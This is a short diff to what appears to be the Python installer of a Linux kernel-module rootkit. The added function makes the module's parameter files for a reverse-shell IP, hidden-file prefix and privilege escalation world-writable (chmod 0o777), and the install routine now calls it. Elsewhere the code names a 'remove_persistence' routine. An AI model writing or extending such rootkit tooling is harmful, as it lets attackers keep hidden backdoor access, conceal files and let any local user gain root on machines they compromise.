@@ -192,6 +192,21 @@ def remove_persistence(module_name):
 
 
 ####
+# Changing permissions on action toggles
+####
+
+def update_permissions(driver_name):
+	"""
+	Makes it so that all kernel module parameter files can be written
+	to by any user.
+	"""
+	params = ["rev_shell_ip", "hidden_file_prefix", "escalate_privileges"]
+	files = ["/sys/module/{}/parameters/{}".format(driver_name, param) for param in params]
+	for file in files:
+		os.chmod(file, 0o777)
+
+
+####
 # Main Setup Methods
 # 	- Install
 # 	- Uninstall
@@ -262,6 +277,7 @@ def install(kernel_version):
 	# Unload kernel module if it's already loaded and load new module.
 	unload_module(config["MODULE_NAME"])
 	load_module(module_dest_path, config)
+	update_permissions(driver_name)
 	print_success("Successful installation.")
 
 
